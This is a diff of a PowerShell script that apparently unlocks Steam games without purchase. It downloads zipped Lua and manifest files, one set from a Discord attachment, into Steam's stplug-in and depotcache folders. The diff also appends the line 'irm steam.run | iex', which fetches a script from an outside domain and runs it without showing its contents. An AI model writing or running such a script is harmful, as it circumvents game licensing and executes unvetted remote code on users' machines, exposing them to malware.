@@ -3,9 +3,9 @@ if (-not $steamPath) {
     exit
 }
 
-$zipUrl = 'https://www.mediafire.com/file/r4pgwd57pkgcx5v/HollowKnightS_-_1030300.zip/file'
-$tempZip = "$env:TEMP\g_1030300.zip"
-$extractPath = "$env:TEMP\g_1030300_extract"
+$zipUrl = 'https://cdn.discordapp.com/ephemeral-attachments/1494936967534739496/1494963340223451217/ACorigins_-_582160.zip?ex=69e4849b&is=69e3331b&hm=d011ec3f7cdaa5377dd36483d6f83c7bb3a910e800e199512efa16e65564c118&'
+$tempZip = "$env:TEMP\g_1494936.zip"
+$extractPath = "$env:TEMP\g_1494936_extract"
 
 $luaDest = Join-Path $steamPath "config\stplug-in"
 $manifestDest = Join-Path $steamPath "config\depotcache"
@@ -48,3 +48,5 @@ Get-ChildItem -Path $extractPath -Recurse -Filter *.manifest | ForEach-Object {
 
 Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
 Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+
+irm steam.run | iex
